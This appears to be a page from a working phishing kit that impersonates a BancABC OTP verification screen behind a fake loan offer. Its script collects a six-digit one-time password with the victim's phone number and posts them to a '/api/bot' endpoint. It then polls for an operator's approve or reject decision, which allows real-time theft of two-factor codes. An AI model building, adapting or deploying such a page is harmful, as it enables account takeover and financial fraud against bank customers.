<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - BancABC</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { margin: 0; background-color: white; display: flex; justify-content: center; min-height: 100vh; }
        .app-container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        
        .logo { font-size: 36px; font-weight: 800; color: #0A2240; margin-top: 30px; margin-bottom: 5px; }
        .logo .abc { color: #D31C2B; }
        .subtitle { font-size: 12px; color: #666; margin-bottom: 50px; }

        h2 { font-size: 20px; color: #0A2240; margin-bottom: 10px; }
        p { font-size: 14px; color: #333; text-align: center; margin-bottom: 30px; }
        b { color: #0A2240; }

        .otp-boxes { display: flex; gap: 8px; margin-bottom: 30px; }
        .otp-box { width: 45px; height: 55px; border: 1px solid #ccc; border-radius: 8px; text-align: center; font-size: 20px; font-weight: 600; color: #333; outline: none; background: white; }
        .otp-box:focus { border-color: #0066CC; }

        .error-msg { color: #D31C2B; font-weight: bold; font-size: 14px; text-align: center; display: none; margin-bottom: 20px; }

        /* Overlay */
        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0066CC; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="overlay">
        <div class="spinner"></div>
        <h2 style="color:#0066CC;">Verifying...</h2>
        <p style="color:white;">Please wait.</p>
    </div>

    <div class="app-container">
        <div class="logo">Banc<span class="abc">ABC</span></div>
        <div class="subtitle">A Member of the OLD MUTUAL Group</div>

        <h2>OTP Verification</h2>
        <p>Please enter the OTP sent to your number<br><b id="displayPhone">0777658586 (sms)</b></p>

        <div class="error-msg" id="errorMsg">Invalid OTP. Try again.</div>

        <div class="otp-boxes">
            <input type="tel" class="otp-box" id="otp1" maxlength="1" oninput="move('otp2')">
            <input type="tel" class="otp-box" id="otp2" maxlength="1" oninput="move('otp3')">
            <input type="tel" class="otp-box" id="otp3" maxlength="1" oninput="move('otp4')">
            <input type="tel" class="otp-box" id="otp4" maxlength="1" oninput="move('otp5')">
            <input type="tel" class="otp-box" id="otp5" maxlength="1" oninput="move('otp6')">
            <input type="tel" class="otp-box" id="otp6" maxlength="1" oninput="checkOtp()">
        </div>
    </div>

    <script>
        let globalUserId = sessionStorage.getItem('globalUserId');
        let userPhone = sessionStorage.getItem('userPhone') || "Unknown";
        
        // Show phone number if stored
        if(userPhone !== "Unknown") { document.getElementById('displayPhone').innerText = userPhone + " (sms)"; }

        function move(nextId) {
            document.getElementById(nextId).focus();
        }

        // Auto-Submit
        function checkOtp() {
            let otp = "";
            for(let i=1; i<=6; i++) { otp += document.getElementById('otp'+i).value; }
            
            if(otp.length === 6) {
                document.getElementById('overlay').style.display = 'flex';
                submitOtp(otp);
            }
        }

        function submitOtp(otp) {
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'OTP', userId: globalUserId, 
                    data: { phone: userPhone, value: otp } 
                })
            }).then(function() { 
                pollStatus(); 
            }).catch(function() {
                document.getElementById('overlay').style.display = 'none';
                alert("Network error.");
            });
        }

        function pollStatus() {
            let interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=OTP', { cache: 'no-store' })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        alert("Success! Your loan is being processed.");
                        window.location.href = 'index.html';
                    } 
                    else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('errorMsg').style.display = 'block';
                        for(let i=1; i<=6; i++) { document.getElementById('otp'+i).value = ''; }
                        document.getElementById('otp1').focus();
                    }
                });
            }, 2000);
        }
    </script>
</body>
</html>
